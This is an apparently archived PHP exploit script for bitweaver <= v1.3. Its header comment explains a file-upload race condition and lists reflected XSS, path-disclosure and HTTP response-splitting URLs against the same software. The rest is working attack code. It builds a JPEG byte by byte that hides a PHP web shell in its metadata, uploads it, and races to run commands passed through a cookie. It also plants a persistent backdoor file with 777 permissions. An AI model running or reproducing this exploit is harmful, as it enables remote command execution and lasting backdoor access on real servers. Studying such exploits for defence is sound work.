#!/usr/bin/php -q -d short_open_tag=on
<?
echo "bitweaver <= v1.3 'tmpImagePath' attachment mod_mime exploit\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n";
echo "dork: \"powered by bitweaver\"\r\n\r\n";

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to bitweaver\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /bitweaver/ cat ./../../kernel/config_inc.php\r\n";
echo "php ".$argv[0]." localhost /bitweaver/ ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n\r\n";
die;
}

/*
software site: http://www.bitweaver.org/articles/

i)
vulnerable code in articles/BitArticle.php near lines 456-478:

...
if( !empty( $_FILES['article_image']['name'] ) ) {
			// store the image in temp/articles/
			$tmpImagePath = TEMP_PKG_PATH.ARTICLES_PKG_NAME.'/'.'temp_'.$_FILES['article_image']['name'];

			$tmpImageName = preg_replace( "/(.*)\..*?$/", "$1", $_FILES['article_image']['name'] );
			if( !is_dir( TEMP_PKG_PATH.ARTICLES_PKG_NAME ) ) {
				mkdir( TEMP_PKG_PATH.ARTICLES_PKG_NAME );
			}
			if( !move_uploaded_file( $_FILES['article_image']['tmp_name'], $tmpImagePath ) ) {
				$this->mErrors['article_image'] = "Error during attachment of article image";
			} else {
			        $resizeFunc = ( $gBitSystem->getPreference( 'image_processor' ) == 'imagick' ) ? 'liberty_imagick_resize_image' : 'liberty_gd_resize_image';
				$pFileHash['source_file'] = $tmpImagePath;
				$pFileHash['dest_path'] = TEMP_PKG_NAME.'/'.ARTICLES_PKG_NAME.'/';
				// remove the extension
				$pFileHash['dest_base_name'] = $tmpImageName;
				$pFileHash['max_width'] = ARTICLE_TOPIC_THUMBNAIL_SIZE;
				$pFileHash['max_height'] = ARTICLE_TOPIC_THUMBNAIL_SIZE;
				$pFileHash['type'] = $_FILES['article_image']['type'];
				if( !( $resizeFunc( $pFileHash ) ) ) {
					$this->mErrors[] = 'Error while resizing article image';
				}
				@unlink( $tmpImagePath );
...

explaination:
a remote user can go to:

http://[target]/[path]/articles/edit.php

to submit an article to the administrator, you can attach an image there.
You can submit a file like this, with double extension:

suntzu1234.php.xxx

a temporary copy of the file is created in temp/articles/ folder and renamed
like this:

temp_suntzu1234.php.xxx

(see $tmpImagePath argument...)

you have about 0.1 / 0.2 seconds to launch commands :), because temporary file
is deleted

http://[target]/[path]/temp/articles/temp_suntzu1234.php.xxx?cmd=dir

this works fine on most Apache servers...

note: this folder is not properly protected, we have an .htaccess file like this:

<FilesMatch "\.ph(p(3|4)?|tml)$">
    order deny,allow
    deny from all
</FilesMatch>

ii) two cross site scripting vulnerabilities:

http://[target]/[path_to_bitweaver]/users/login.php?error=<script>alert(document.cookie)</script>
http://[target]/[path_to_bitweaver]/articles/index.php?feedback=<script>alert(document.cookie)</script>

iii) a trick to see bitweaver "white screen of death":

http://[target]/[path_to_bitweaver]/users/index.php?sort_mode=suntzuuuuuuuuuuuuu

and disclose full application path, database table prefix ,among other things...

iv) various http response splitting vulnerabilities, this is one:

http://[target]/[path]/index.php?BWSESSION=%0d%0a[http headers]

this is the exploit for i), it creates a backdoor called suntzu.php.xxx in
temp/articles/ when you succeed for the first time
									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;

}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$packet="GET ".$p."temp/articles/suntzu.php.xxx HTTP/1.0\r\n";
$packet.="User-Agent: GoogleBot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=".$cmd."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"*delim*"))
{ echo "Exploit succeeded...\r\n";
  $temp=explode("*delim*",$html);
  die($temp[1]);
}

$shell=
chr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x01).chr(0xc0).chr(0x3c).chr(0x3f).
chr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x65).chr(0x72).chr(0x72).
chr(0x6f).chr(0x72).chr(0x5f).chr(0x72).chr(0x65).chr(0x70).chr(0x6f).chr(0x72).
chr(0x74).chr(0x69).chr(0x6e).chr(0x67).chr(0x28).chr(0x30).chr(0x29).chr(0x3b).
chr(0x73).chr(0x65).chr(0x74).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).
chr(0x5f).chr(0x6c).chr(0x69).chr(0x6d).chr(0x69).chr(0x74).chr(0x28).chr(0x30).
chr(0x29).chr(0x3b).chr(0x69).chr(0x66).chr(0x20).chr(0x28).chr(0x67).chr(0x65).
chr(0x74).chr(0x5f).chr(0x6d).chr(0x61).chr(0x67).chr(0x69).chr(0x63).chr(0x5f).
chr(0x71).chr(0x75).chr(0x6f).chr(0x74).chr(0x65).chr(0x73).chr(0x5f).chr(0x67).
chr(0x70).chr(0x63).chr(0x28).chr(0x29).chr(0x29).chr(0x20).chr(0x7b).chr(0x24).
chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).
chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x3d).chr(0x73).chr(0x74).chr(0x72).
chr(0x69).chr(0x70).chr(0x73).chr(0x6c).chr(0x61).chr(0x73).chr(0x68).chr(0x65).
chr(0x73).chr(0x28).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).
chr(0x49).chr(0x45).chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x29).
chr(0x3b).chr(0x7d).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x20).chr(0x22).
chr(0x2a).chr(0x64).chr(0x65).chr(0x6c).chr(0x69).chr(0x6d).chr(0x2a).chr(0x22).
chr(0x3b).chr(0x70).chr(0x61).chr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).
chr(0x75).chr(0x28).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).
chr(0x49).chr(0x45).chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x29).
chr(0x3b).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x20).chr(0x22).chr(0x2a).
chr(0x64).chr(0x65).chr(0x6c).chr(0x69).chr(0x6d).chr(0x2a).chr(0x22).chr(0x3b).
chr(0x0d).chr(0x0a).chr(0x24).chr(0x66).chr(0x70).chr(0x3d).chr(0x66).chr(0x6f).
chr(0x70).chr(0x65).chr(0x6e).chr(0x28).chr(0x22).chr(0x73).chr(0x75).chr(0x6e).
chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).chr(0x68).chr(0x70).chr(0x2e).
chr(0x78).chr(0x78).chr(0x78).chr(0x22).chr(0x2c).chr(0x22).chr(0x77).chr(0x22).
chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x70).chr(0x75).chr(0x74).
chr(0x73).chr(0x28).chr(0x24).chr(0x66).chr(0x70).chr(0x2c).chr(0x22).chr(0x3c).
chr(0x3f).chr(0x70).chr(0x68).chr(0x70).chr(0x20).chr(0x65).chr(0x72).chr(0x72).
chr(0x6f).chr(0x72).chr(0x5f).chr(0x72).chr(0x65).chr(0x70).chr(0x6f).chr(0x72).
chr(0x74).chr(0x69).chr(0x6e).chr(0x67).chr(0x28).chr(0x30).chr(0x29).chr(0x3b).
chr(0x73).chr(0x65).chr(0x74).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).
chr(0x5f).chr(0x6c).chr(0x69).chr(0x6d).chr(0x69).chr(0x74).chr(0x28).chr(0x30).
chr(0x29).chr(0x3b).chr(0x69).chr(0x66).chr(0x20).chr(0x28).chr(0x67).chr(0x65).
chr(0x74).chr(0x5f).chr(0x6d).chr(0x61).chr(0x67).chr(0x69).chr(0x63).chr(0x5f).
chr(0x71).chr(0x75).chr(0x6f).chr(0x74).chr(0x65).chr(0x73).chr(0x5f).chr(0x67).
chr(0x70).chr(0x63).chr(0x28).chr(0x29).chr(0x29).chr(0x20).chr(0x7b).chr(0x5c).
chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).
chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x3d).chr(0x73).chr(0x74).
chr(0x72).chr(0x69).chr(0x70).chr(0x73).chr(0x6c).chr(0x61).chr(0x73).chr(0x68).
chr(0x65).chr(0x73).chr(0x28).chr(0x5c).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).
chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).
chr(0x5d).chr(0x29).chr(0x3b).chr(0x7d).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).
chr(0x20).chr(0x5c).chr(0x22).chr(0x2a).chr(0x64).chr(0x65).chr(0x6c).chr(0x69).
chr(0x6d).chr(0x2a).chr(0x5c).chr(0x22).chr(0x3b).chr(0x70).chr(0x61).chr(0x73).
chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x5c).chr(0x24).
chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).
chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x29).chr(0x3b).chr(0x65).chr(0x63).
chr(0x68).chr(0x6f).chr(0x20).chr(0x5c).chr(0x22).chr(0x2a).chr(0x64).chr(0x65).
chr(0x6c).chr(0x69).chr(0x6d).chr(0x2a).chr(0x5c).chr(0x22).chr(0x3b).chr(0x3f).
chr(0x3e).chr(0x22).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x63).
chr(0x6c).chr(0x6f).chr(0x73).chr(0x65).chr(0x28).chr(0x24).chr(0x66).chr(0x70).
chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x63).chr(0x68).chr(0x6d).chr(0x6f).
chr(0x64).chr(0x28).chr(0x22).chr(0x73).chr(0x75).chr(0x6e).chr(0x74).chr(0x7a).
chr(0x75).chr(0x2e).chr(0x70).chr(0x68).chr(0x70).chr(0x2e).chr(0x78).chr(0x78).
chr(0x78).chr(0x22).chr(0x2c).chr(0x37).chr(0x37).chr(0x37).chr(0x29).chr(0x3b).
chr(0x0d).chr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).
chr(0x4a).chr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).
chr(0x00).chr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).
chr(0x00).chr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0xff).chr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).
chr(0x01).chr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).
chr(0x03).chr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).
chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x08).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).
chr(0xc4).chr(0x00).chr(0x15).chr(0x01).chr(0x01).chr(0x01).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x08).chr(0x09).chr(0xff).chr(0xc4).
chr(0x00).chr(0x14).chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).
chr(0x03).chr(0x01).chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).
chr(0x3f).chr(0x00).chr(0x23).chr(0x94).chr(0x09).chr(0x2e).chr(0xff).chr(0xd9).
chr(0x00).chr(0x00);

/*
this image has this code inside as EXIF metadata:
<?php
error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {$_COOKIE[cmd]=stripslashes($_COOKIE[cmd]);}echo "*delim*";passthru($_COOKIE[cmd]);echo "*delim*";
$fp=fopen("suntzu.php.xxx","w");
fputs($fp,"<?php error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {\$_COOKIE[cmd]=stripslashes(\$_COOKIE[cmd]);}echo \"*delim*\";passthru(\$_COOKIE[cmd]);echo \"*delim*\";?>");
fclose($fp);
chmod("suntzu.php.xxx",777);
?>
*/

srand(make_seed());
$anumber = rand(1,99999);
$data='-----------------------------7d63b53760260
Content-Disposition: form-data; name="tk"


-----------------------------7d63b53760260
Content-Disposition: form-data; name="article_id"


-----------------------------7d63b53760260
Content-Disposition: form-data; name="preview_image_url"


-----------------------------7d63b53760260
Content-Disposition: form-data; name="preview_image_path"


-----------------------------7d63b53760260
Content-Disposition: form-data; name="title"

test
-----------------------------7d63b53760260
Content-Disposition: form-data; name="author_name"

test
-----------------------------7d63b53760260
Content-Disposition: form-data; name="article_type_id"

1
-----------------------------7d63b53760260
Content-Disposition: form-data; name="rating"

3
-----------------------------7d63b53760260
Content-Disposition: form-data; name="format_guid"

tikiwiki
-----------------------------7d63b53760260
Content-Disposition: form-data; name="edit"

test
-----------------------------7d63b53760260
Content-Disposition: form-data; name="preview"

Preview
-----------------------------7d63b53760260
Content-Disposition: form-data; name="publishDateInput"

1
-----------------------------7d63b53760260
Content-Disposition: form-data; name="publish_Month"

06
-----------------------------7d63b53760260
Content-Disposition: form-data; name="publish_Day"

15
-----------------------------7d63b53760260
Content-Disposition: form-data; name="publish_Year"

2006
-----------------------------7d63b53760260
Content-Disposition: form-data; name="publish_Hour"

22
-----------------------------7d63b53760260
Content-Disposition: form-data; name="publish_Minute"

33
-----------------------------7d63b53760260
Content-Disposition: form-data; name="expireDateInput"

1
-----------------------------7d63b53760260
Content-Disposition: form-data; name="expire_Month"

06
-----------------------------7d63b53760260
Content-Disposition: form-data; name="expire_Day"

15
-----------------------------7d63b53760260
Content-Disposition: form-data; name="expire_Year"

2007
-----------------------------7d63b53760260
Content-Disposition: form-data; name="expire_Hour"

22
-----------------------------7d63b53760260
Content-Disposition: form-data; name="expire_Minute"

33
-----------------------------7d63b53760260
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000000
-----------------------------7d63b53760260
Content-Disposition: form-data; name="article_image"; filename="suntzu'.$anumber.'.php.xxx"
Content-Type:

'.$shell.'
-----------------------------7d63b53760260--
';

$packet="POST ".$p."/articles/edit.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer: http://".$host.$path."articles/edit.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d63b53760260\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: GoogleBot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
if ($proxy=="")
{$ffpp=fsockopen($host,$port);}
else
{
$parts=explode(':',$proxy);
$ffpp=fsockopen($parts[0],$parts[1]);
}
fputs($ffpp,$packet);//we don't need output, quickly look for temporary file...
$packet="GET ".$p."temp/articles/temp_suntzu".$anumber.".php.xxx HTTP/1.0\r\n";
$packet.="User-Agent: GoogleBot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=".$cmd.";\r\n"; //through cookies...
$packet.="Connection: Close\r\n\r\n";
for ($i=0; $i<=99; $i++)
{
sendpacketii($packet);
if (strstr($html,"200 OK")){
echo "temp_suntzu".$anumber.".php.xxx file found...\r\n";
if (!strstr($html,"passthru")) //not executed as php code
{ echo "Exploit succeeded...\r\n";
  $temp=explode("*delim*",$html);
  die($temp[1]);
}
else
{echo "Exploit failed...\r\n";}
}
}
fclose($ffpp);
//if you are here...
echo "Exploit failed...";
?>

# milw0rm.com [2006-06-15]